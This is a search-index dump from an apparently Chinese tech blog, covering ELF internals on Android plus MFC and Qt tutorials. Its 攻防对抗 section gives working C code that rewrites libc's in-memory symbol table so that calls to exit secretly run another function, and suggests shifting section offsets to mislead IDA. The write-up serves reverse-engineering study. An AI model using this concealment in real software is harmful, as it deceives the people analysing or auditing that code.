SHT_GNU_verdneed = 0x6ffffffe, /* Version needs section */ SHT_GNY_versym = 0x6fffffff, /* Version symbol table */ SHT_HISUNW = 0x6fffffff, /* Sun-specific high bound */ SHT_HIOS = 0x6fffffff, /* Highest OS-specific section type */ SHT_LOPROC = 0x70000000, /* Start of processor-specific section type */ SHT_HIPROC = 0x7fffffff, /* End of processor-specific section type */ SHT_LOUSER = 0x80000000, /* Start of application-specific */ SHT_HIUSER = 0x8fffffff /* Ennd of application-specific */ } s_type32_e; sh_flags: 4字节,由一系列标志比特位组成. sh_addr: 4字节,内存地址. sh_offset: 4字节,文件偏移. sh_size: 4字节,节大小. sh_link: 4字节,一个索引值,指向节头表中本节所对应的位置. sh_info: 4字节,节的附加信息,根据节的类型不同,本成员的意义也有所不同. sh_addralign: 4字节, 对齐值. sh_entsize: 4字节,有一些节的内容是一张表,其中每一个表项的大小是固定的,比如符号表,对于这种表来说,本成员指定其每一个表项的大小. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:3","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"特殊节 /*节名字不重要,重要的是节的类型. 当节名字未被修改过,是具有参考价值的. */ .shstrtab 节名称表 .text 代码段 .bss 数据段(未初始化) .data 数据段(初始化) .rodata 常量区 //ndk的版本信息,仅供参考 .note.android.ident .note.gnu.build - id .note.gnu.gold - version //编译器版本信息 .comment .gnu.version .gnu.version_r .ARM.attributes //调试信息,等价于PDB文件 .debug_str .debug_abbrev .debug_info .debug_macinfo .debug_frame .debug_line .debug_loc .debug_ranges .debug_aranges //初始化表 .init_array //初始化函数表 .fini_array //反初始化函数表 //异常表, 不是ELF的标准,是由操作系统和编译器自定义的 .ARM.exidx //索引表 .ARM.extab //异常表 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:4","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"符号表 //符号表 //当打包为apk,里面的动态库只有.dynsym .dynsym .symtab //符号表字符串 .dynstr .strtab 符号表项结构: typedef struct { Elf32_Word st_name; //符号的名字,指向字符串表的索引 Elf32_Addr st_value; //符号的值, 地址, 是个RVA Elf32_Word st_size; //符号的大小 unsigned char st_info; //符号的类型和属性 unsigned char st_other; //暂未使用 Elf32_Half st_shndx; //一个索引值,指向相关联的节在节头表中的索引 } Elf32_Sym; 符号表描述了导入和导出,st_value的值为非0,表示是导出为0,则表示是导入. st_name: 指向字符串表的索引,节头表中的link值说明了是哪个字符串表. st_info: #define ELF32_ST_BIND(i) ((i)\u003e\u003e4) #define ELF32_ST_TYPE(i) ((i)\u00260xf) #define ELF32_ST_INFO(b,t) (((b)\u003c\u003c4)+((t)\u00260xf)) 高4字节是符号绑定. 低4字节是符号类型. st_shndx: 这里我们导出一个全局变量,来理解下这个字段的意思. 源代码: int g_n = 100; int main(int argc, char* argv[]) { printf(\"Hello ELF! %d\\n\", g_n); return 0; } 分析: 从上图中可以看到,导出的全局变量g_n的RVA为0x2000,大小为4字节,st_shndx字段为22. 那么这个全局变量的值在文件偏移的哪个地方记录呢? 我们去节头表中的第22项看下. 节头表的第22项,所在的RVA是0x2000,FOA是0x1000, 而全局变量g_n的RVA为0x2000,大小为4字节, 也就是说文件偏移0x1000的地方开始是4字节内容就是全局变量的值,100. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:5","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"哈希表 //哈希表 .hash //旧版,导入导出均可查 .gnu.hash //新版,效率高,只可查导出 旧版(.hash): 哈希表结构: Bucket数组中含有nbucket个项,chain数组中含有nchain个项,序号都从0开始. Bucket和chain中包含的都是符号表中的索引.hash有可能冲突,chain里面放的就是所有冲突的. 给定一个符号名字,返回一个哈希值x,然后由bucket[x%nbucket]得到一个符号表索引y, 如果索引y对应的符号表项不是想要的符号(通过对比名字),则由chain[y]得到下一个符号表索引z,如果仍不是想要的符号,继续chain[z]…, 如果chain[z]的值为0,说明该符号不存在. 哈希算法: 原始算法: unsigned long elf_hash(const unsigned char* name) { unsigned long h = 0, g; while (*name) { h = (h \u003c\u003c 4) + *name++; if (g = h \u0026 0xf0000000) h ^= g \u003e\u003e 24; h \u0026= ~g; } return h; } Android中的hash算法: Google并没有用原始的hash算法. //http://androidxref.com/4.0.3_r1/xref/bionic/linker/linker.c#elfhash static unsigned elfhash(const char* _name) { const unsigned char* name = (const unsigned char*)_name; unsigned h = 0, g; while (*name) { h = (h \u003c\u003c 4) + *name++; g = h \u0026 0xf0000000; h ^= g; h ^= g \u003e\u003e 24; } return h; } 示例: 环境:解压AndroidStudio编译出来的Release版apk,查看其中的so文件. 目标:查找main这个符号. 查看.hash数据. 可以得到: nbucket = 0x11 nchain = 0x14 计算hash%nbucket. 得到的结果y = 10. 查找main. y = 10,bucket[y] = 7,查看动态符号表的第7项不是main, chain[7] = 3,查看动态符号表的第3项不是main, chain[3] = 0x11,查看动态符号表的第17项是main. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:6","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"程序链接表 .plt //过程链接,Procedure Link Table 外部调用的跳板,是个代理函数. IDA是通过节表拿到plt节的地址,从而解析plt函数的. 从上图中可以看到每两个plt函数之间的大小为12字节, 假如我们将节表中plt节的偏移加12字节的倍数,IDA解析api就会错位,实际上也确是如此. 这样修改之后不会影响程序的运行,因为程序的运行是不需要节表的. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:7","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"全局偏移表 .got //等价于PE中的IAT表,Global Offset Table 记录外部调用的入口地址. plt和got的关系: //每调一个api,编译器就会生成一个plt函数 int (*g_printf)(const char* __fmt, ...) = plt; /* * plt: * jmp [got] * * got: * load1 * * load1: * dlopen * dlsym * got = addr */ ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:8","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"重定位表 .rel.plt //修api地址 .rel.dyn //修全局变量 项结构: typedef struct { Elf32_Addr r_offset; //Rva,修完之后放在哪里 Elf32_Word r_info; //既给出了重定位所作用的符号表索引,也给出了重定位的类型 } Elf32_Rel; typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend; } Elf32_Rela; r_info 的宏定义: #define ELF32_R_SYM(i) ((i)\u003e\u003e8) //高24位是符号表索引,修的位置 #define ELF32_R_TYPE(i) ((unsigned char)(i)) //低8位是重定位的类型,如何修 #define ELF32_R_INFO(s,t) (((s)\u003c\u003c8)+(unsigned char)(t)) 示例: Elf32_Xword s_entsize = 8, 表示每项为8字节 第一项为 F0 1F 00 00 16 02 00 00 r_offset: 0x1FF0 符号表索引:0x02 重定位类型:0x16 IDA查看偏移: 符号表第2项: ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:9","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"动态节 .dynamic /*这里存放了软件运行时所需要的表,操作系统是从这里拿表的. 但是这样说又有点矛盾,因为我们前面讲软件的运行是不需要节表的. 那么操作系统不通过节表,如何拿到动态节的地址? 段中有描述.*/ 项结构: typedef struct { Elf32_Sword d_tag; //什么表 union { //在哪里 Elf32_Word d_val; Elf32_Addr d_ptr; } d_un; } Elf32_Dyn; d_tag: DT_NEEDED: 这里面存放的是软件运行所需要的动态库. 前面我们讲符号表和重定位表,都没有提到对应的api在哪个库里面. 假设软件运行需要两个库,libc.so、 libm.so 现在有一个api,操作系统会看这个api在libc.so里面没, 如果不在,就去看libm.so里面有没有这个导出函数. 操作系统就这样遍历需要加载的库,就知道对应的api在哪个库里面了. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:10","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"程序头表 用来保存程序加载到内存中所需要的信息,用段(segment)来表示,与节头表类似,同样是数组结构. 数组的位置在偏移e_phoff处,每个元素(segment header)的大小为e_phentsize,共有e_phnum个元素. 程序头结构: typedef struct { Elf32_Word p_type; Elf32_Off p_offset; Elf32_Addr p_vaddr; Elf32_Addr p_paddr; Elf32_Word p_filesz; Elf32_Word p_memsz; Elf32_Word p_flags; Elf32_Word p_align; } Elf32_Phdr; p_type: 类型 PT_NULL:表示该段未使用. PT_LOAD:表示要将文件中的segment内容映射到进程内存中对应的地址上. PT_DYNAMIC:动态节. PT_INTERP:包含interpreter的路径. PT_HDR:表示程序头表本身. p_offset: 该段的文件偏移. p_vaddr: 段数据应该加载到进程的虚拟地址. p_paddr: 段数据应该加载到进程的物理地址. p_filesz: 该段的文件大小. p_memsz: 该段的内存大小. p_flags: 段的内存属性. p_align: 该段数据的对齐值. 段示例: ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:11","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"攻防对抗 动态运行-修改API地址 要实现的效果是,代码中动态调用libc.so库中的exit函数,通过修改libc.so符号表中的exit函数的地址为任意函数地址,从而使在IDA中静态分析,看到的是调用exit函数,实际上调用的是其他函数.函数前加static关键字,可使该函数不导出. #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cstdio.h\u003e #include \u003celf.h\u003e #include \u003cdlfcn.h\u003e #include \u003csys/mman.h\u003e #define SOINFO_NAME_LEN 128 struct soinfo { const char name[SOINFO_NAME_LEN]; Elf32_Phdr *phdr; int phnum; unsigned entry; unsigned base; unsigned size; int unused; // DO NOT USE, maintained for compatibility. unsigned *dynamic; unsigned wrprotect_start; unsigned wrprotect_end; soinfo *next; unsigned flags; const char *strtab; Elf32_Sym *symtab; unsigned nbucket; unsigned nchain; unsigned *bucket; unsigned *chain; unsigned *plt_got; Elf32_Rel *plt_rel; unsigned plt_rel_count; Elf32_Rel *rel; unsigned rel_count; Elf32_Rela *plt_rela; unsigned plt_rela_count; Elf32_Rela *rela; unsigned rela_count; unsigned *preinit_array; unsigned preinit_array_count; unsigned *init_array; unsigned init_array_count; unsigned *fini_array; unsigned fini_array_count; void (*init_func)(void); void (*fini_func)(void); unsigned *ARM_exidx; unsigned ARM_exidx_count; unsigned refcount; }; static unsigned elfhash(const char *_name) { const unsigned char *name = (const unsigned char *) _name; unsigned h = 0, g; while(*name) { h = (h \u003c\u003c 4) + *name++; g = h \u0026 0xf0000000; h ^= g; h ^= g \u003e\u003e 24; } return h; } //获取模块基址 void *get_module_base(const char *moduleName) { char buf[260] = {}; void *addr = NULL; FILE *fp = fopen(\"/proc/self/maps\", \"r\"); if (fp == NULL) { perror(\"fopen\"); return NULL; } while (!feof(fp)) { memset(buf, 0, sizeof buf); fgets(buf, sizeof buf, fp); if (strstr(buf, moduleName) != NULL) { sscanf(buf, \"%08x\", \u0026addr); break; } } fclose(fp); return addr; } void FillSoInfoStruct(soinfo* si, const char* szLibName){ //获取libc.so的模块基址 char* libc_base = (char*)get_module_base(szLibName); si-\u003ebase = (unsigned)libc_base; //拿动态节地址 elf32_hdr* header = (elf32_hdr*)si-\u003ebase; elf32_phdr* phdr = (elf32_phdr*)(si-\u003ebase + header-\u003ee_phoff); Elf32_Dyn *dyn = NULL; for (int i = 0; i \u003c header-\u003ee_phnum; ++i) { if (phdr[i].p_type == PT_DYNAMIC){ dyn = (Elf32_Dyn*)(si-\u003ebase + phdr[i].p_vaddr); si-\u003edynamic = (unsigned *)dyn; break; } } printf(\"dyn = %p\\n\", dyn); //遍历表 //遍历表的操作, Android源码中有写,这里查看的是Android 4.0.3_r1版本的源码 //在xref: /bionic/linker/linker.c中 //搜索DT_HASH unsigned *d; for(d = si-\u003edynamic; *d; d++){ switch(*d++){ case DT_HASH: si-\u003enbucket = ((unsigned *) (si-\u003ebase + *d))[0]; si-\u003enchain = ((unsigned *) (si-\u003ebase + *d))[1]; si-\u003ebucket = (unsigned *) (si-\u003ebase + *d + 8); si-\u003echain = (unsigned *) (si-\u003ebase + *d + 8 + si-\u003enbucket * 4); break; case DT_STRTAB: si-\u003estrtab = (const char *) (si-\u003ebase + *d); break; case DT_SYMTAB: si-\u003esymtab = (Elf32_Sym *) (si-\u003ebase + *d); break; } } } //获取函数名对应的符号表的下标 int GetSymtabIndex(soinfo* si, char* szFuncName){ //查询hash表 int nIndex = elfhash(szFuncName) % si-\u003enbucket; nIndex = si-\u003ebucket[nIndex]; if (nIndex == 0){ return 0; } do { if (strcmp(si-\u003estrtab + si-\u003esymtab[nIndex].st_name, szFuncName) == 0){ break; } nIndex = si-\u003echain[nIndex]; } while (nIndex != 0); return nIndex; } //替换后的函数 //加static,可使该函数不导出 static void fun2(int n){ puts(\"fun2\"); } __attribute__((constructor)) void fun1(){ puts(\"fun1\"); //soinfo结构体是操作系统内部的结构体 soinfo si = {0}; //填充soinfo结构体 FillSoInfoStruct(\u0026si, \"libc.so\"); //获取libc.so库中的exit函数在符号表中的下标 int nIndex = GetSymtabIndex(\u0026si, \"exit\"); if (nIndex == 0){ return; } //修改libc.so库中的exit函数地址为fun2的地址 mprotect((void*)((int)\u0026si.symtab[nIndex] \u0026 ~0xfff), 0x1000, PROT_READ | PROT_WRITE); si.symtab[nIndex].st_value = (char*)fun2 - (char*)si.base; } typedef void (*pfnEXIT)(int); int main(int argc, char* argv[]){ //直接调exit(0), 走的是plt函数 void* handle = dlopen(\"libc.so\", 0); pfnEXIT pfnExit = (pfnEXIT)dlsym(handle, \"exit\"); pfnExit(0); return 0; } 动态调用修改api地址.7z Got表Hook #include \u003cjni.h\u003e #include \u003cstring\u003e #include \u003cstdio.h\u003e #include \u003celf.h\u003e #include \u003cdlfcn.h\u003e #include \u003csys/mman.h\u003e #include \u003cunistd.h\u003e #include \u003climits.h\u003e #define SOINFO_NAME_LEN 128 struct soinfo { const char nam","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:12","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"参考链接 ELF文件格式解析 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:13","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["界面编程"],"content":"Radio Button 需设置group属性,才可在类向导对应类中的成员变量栏看到单选框. 若绑定变量类型为int,0,1,2…分别对应对话框中第几个单选框. 示例: UpdateData(TRUE); switch (m_nGender) { case 0: { AfxMessageBox(\"性别 男\"); break; } case 1: { AfxMessageBox(\"性别 女\"); break; } } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:1:0","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Combo Box 绑定CComboBox这个类型. //可向组合框中的项添加4字节的附加数据 int SetItemData( int nIndex, DWORD dwItemData ); DWORD GetItemData( int nIndex ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:0","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"初始化 //在OnInitDialog这个函数中写代码 int nItemIdx = 0; //向组合框中添加内容 m_cmbLocation.AddString(\"河南\"); m_cmbLocation.SetItemData(nItemIdx++, 10);//为每一项添加4字节的附加数据 m_cmbLocation.AddString(\"湖南\"); m_cmbLocation.SetItemData(nItemIdx++, 10); //设置组合框默认选项 m_cmbLocation.SetCurSel(0); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:1","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取组合框选中项的文本 //获取当前选中的索引值 int nIdx = m_cmbLocation.GetCurSel(); //通过索引值获取文本 CString csBuf; m_cmbLocation.GetLBText(nIdx, csBuf); //获取保存在此项的4字节附加数据 DWORD dwExtraData = m_cmbLocation.GetItemData(nIdx); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:2:2","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"List Control 设置列表控件属性中的View为Report 绑定CListCtrl这个类型 //可向列表控件的项添加4字节的附加数据 BOOL SetItemData( int nItem, DWORD dwData ); DWORD GetItemData( int nItem ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:0","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"初始化 //在OnInitDialog这个函数中写代码 //初始化列表控件 //插入表头 int nColIdx = 0; m_LstCtrl.InsertColumn(nColIdx++, \"姓名\"); m_LstCtrl.InsertColumn(nColIdx++, \"性别\"); m_LstCtrl.InsertColumn(nColIdx++, \"爱好\"); //添加内容 int nItemIdx = 0;//列表控件的行 //插入第一项 m_LstCtrl.InsertItem(nItemIdx, \"Luo\"); int nSubItemIdx = 1;//列表控件的列 m_LstCtrl.SetItemText(nItemIdx, nSubItemIdx++, \"男\"); m_LstCtrl.SetItemText(nItemIdx, nSubItemIdx++, \"敲代码\"); //设置整行选择 DWORD dwStyle = m_LstCtrl.GetExtendedStyle(); m_LstCtrl.SetExtendedStyle(dwStyle | LVS_EX_FULLROWSELECT); //设置所有列根据内容自动调整宽度 //获取表头 CHeaderCtrl* pHeaderCtrl = m_LstCtrl.GetHeaderCtrl(); //通过表头获取有多少列 int nColNum = pHeaderCtrl-\u003eGetItemCount(); for (int i = 0; i \u003c nColNum;i++) { m_LstCtrl.SetColumnWidth(i, LVSCW_AUTOSIZE_USEHEADER); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:1","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取列表控件选中项的文本 //获取当前选中的行的索引值 int nItemIdx = m_LstCtrl.GetSelectionMark(); //获取选中行的文本信息 CString csName = m_LstCtrl.GetItemText(nItemIdx, 0); CString csGender = m_LstCtrl.GetItemText(nItemIdx, 1); CString csLike = m_LstCtrl.GetItemText(nItemIdx, 2); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:2","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"右键弹出菜单 新建一个菜单资源: 响应菜单消息: 打开类向导,在命令栏中找到List Control对应的ID 在右边的消息中,双击NM_RCLICK 添加代码 LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast\u003cLPNMITEMACTIVATE\u003e(pNMHDR); // TODO: 在此添加控件通知处理程序代码 *pResult = 0; //坐标转换 m_LstCtrl.ClientToScreen(\u0026pNMItemActivate-\u003eptAction); //弹出菜单 CMenu cMn; cMn.LoadMenu(IDR_MENU1);//从资源加载菜单 CMenu* pSubMenu = cMn.GetSubMenu(0);//获取子菜单 pSubMenu-\u003eTrackPopupMenu(TPM_LEFTALIGN, pNMItemActivate-\u003eptAction.x, pNMItemActivate-\u003eptAction.y, this);//最后一个参数类型CWnd*,填写处理这一消息的窗口指针 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:3:3","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"Tree Control 绑定CTreeCtrl这个类型 //可向树控件中的项添加4字节的附加数据 BOOL SetItemData( HTREEITEM hItem, DWORD dwData ); DWORD GetItemData( HTREEITEM hItem ) const; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:0","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"设置风格 //获取树控件的句柄 HWND hwndTree = GetDlgItem(m_hWnd, IDC_TREE); //设置树控件的风格 DWORD dwStyle = GetWindowLong(hwndTree, GWL_STYLE); dwStyle = dwStyle | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS; SetWindowLong(hwndTree, GWL_STYLE, dwStyle); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:1","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"添加数据 HTREEITEM InsertItem( LPTVINSERTSTRUCT lpInsertStruct ); HTREEITEM InsertItem(UINT nMask, LPCTSTR lpszItem, int nImage, int nSelectedImage, UINT nState, UINT nStateMask, LPARAM lParam, HTREEITEM hParent, HTREEITEM hInsertAfter ); HTREEITEM InsertItem( LPCTSTR lpszItem, HTREEITEM hParent = TVI_ROOT, HTREEITEM hInsertAfter = TVI_LAST ); HTREEITEM InsertItem( LPCTSTR lpszItem, int nImage, int nSelectedImage, HTREEITEM hParent = TVI_ROOT, HTREEITEM hInsertAfter = TVI_LAST); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:2","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"获取选中节点 HTREEITEM GetSelectedItem( ); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/:4:3","tags":["Windows"],"title":"Mfc","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/mfc/"},{"categories":["界面编程"],"content":"介绍 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt安装 https://download.qt.io/ 目前我下载的是5.12.10版本 https://download.qt.io/archive/qt/5.12/5.12.10/ VS插件安装: https://download.qt.io/archive/vsaddin/ ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:1","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"第一个Qt项目 工程规范化: 创建一个文件夹Lesson,然后分别创建bin、doc、lib、src文件夹. D:. │ └─Lesson ├─bin ├─doc ├─lib └─src 新建一个qt工程,目录放在src中. 目录文件介绍: D:. │ ├─bin ├─doc ├─lib └─src ├─build-QtTest-Desktop_Qt_5_12_10_MSVC2017_32bit-Debug │ │ .qmake.stash │ │ Makefile │ │ Makefile.Debug │ │ Makefile.Release │ │ ui_widget.h //这是qt设计器代码 │ │ │ ├─debug │ │ main.obj │ │ moc_predefs.h //qt中与信号槽相关的代码 │ │ moc_widget.cpp │ │ moc_widget.obj │ │ QtTest.exe │ │ QtTest.ilk │ │ QtTest.pdb │ │ QtTest.vc.pdb │ │ widget.obj │ │ │ └─release └─QtTest main.cpp QtTest.pro //这是qt的项目文件,用来生成makefile文件. QtTest.pro.user //这是qt的编译环境,可删掉,重新指定编译环境. widget.cpp widget.h widget.ui 注意 在Qt中创建的.h .cpp文件的文件名要小写,为了跨平台. 在windows平台,文件名大小写不敏感,但在其他平台大小写可能是敏感的. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:1:2","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QMake ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt程序编译步骤 编译Qt pro文件生成makefile 使用jom或make编译makefile jom下载链接 jom或make会进行下述代码生成: 生成界面源码 uic.exe widget.ui -o ui_widget.h 生成信号槽代码 moc.exe widget.h moc_widget.cpp 控制台手工编译Qt程序步骤如下: 准备源文件 #include \u003cstdio.h\u003e void func1(); #include \"func1.h\" void func1(){ printf(\"func1\\n\"); } #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \"func1.h\" int main(){ func1(); printf(\"main\\n\"); system(\"pause\"); return 0; } 编写pro文件 SOURCES += \\ main.cpp \\ func1.cpp HEADERS += \\ func1.h CONFIG += console 这一步也可以利用qmake自动生成 //命令行执行以下语句,添加VC环境 \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" //执行qmake语句 qmake -project 编译 call \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" qmake -o makefile LuoQt.pro jom /f makefile pause 控制台编译Qt.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:1","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt项目转VS工程 有以下两种方式: 命令行 //添加VC环境 \"D:/VS2019/VS2019/VC/Auxiliary/Build/vcvarsx86_amd64.bat\" //生成vcxproj文件 qmake -tp vc luoQt.pro 利用插件打开pro项目 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:2:2","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"信号槽 摘要 类似Windows的消息机制 信号函数只发送不需要知道接收者 槽函数只接收不管通信.在主线程中调用,不要在其他线程中调,会崩!!! 使用QObject::connect()函数进行绑定 Qt信号槽原理如下: 绑定信号函数与槽函数. 调用信号函数(将信号写入队列中). 主线程从队列中获取信号. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"通过QtCreator设置信号槽 有以下两种方式: 拖动. 添加,点下方的加号进行添加. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:1","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"手动添加槽函数 Q_OBJECT: 如果一个类中,我们添加了信号槽,我们就要定义Q_OBJECT这个宏,这样的话,QT的moc程序才会帮我们生成代码. 示例: class luoqt : public QWidget { Q_OBJECT public: luoqt(QWidget *parent = Q_NULLPTR); //信号函数,只声明即可 signals: void TstSignal(); //槽函数声明 public slots: void TstSlot(); private: Ui::luoqtClass ui; }; //槽函数定义 void luoqt::TstSlot() { printf(\"Hello TstSlot\\n\"); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:3:2","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"利用QtCreator绑定信号槽 将上述写的槽函数绑定到按钮的点击事件中: 新建一个按钮,利用QtCreator拖动来设置. 点击上述编辑按钮后,添加新建的槽函数. 将按钮点击和刚创建的槽函数绑定起来. 这样的话,就可以了,测试的时候,我们将控制台打开. 将上述写的信号函数和槽函数绑定起来: 利用QtCreator拖动来设置,在空白的地方拖一下就可以了. 添加信号函数和槽函数. 绑定. Qt生成代码分析: 上面这些操作Qt帮我们生成了很多的代码, 生成Connect代码. 将信号和槽函数转化为字符串. moc生成的槽函数调用代码. 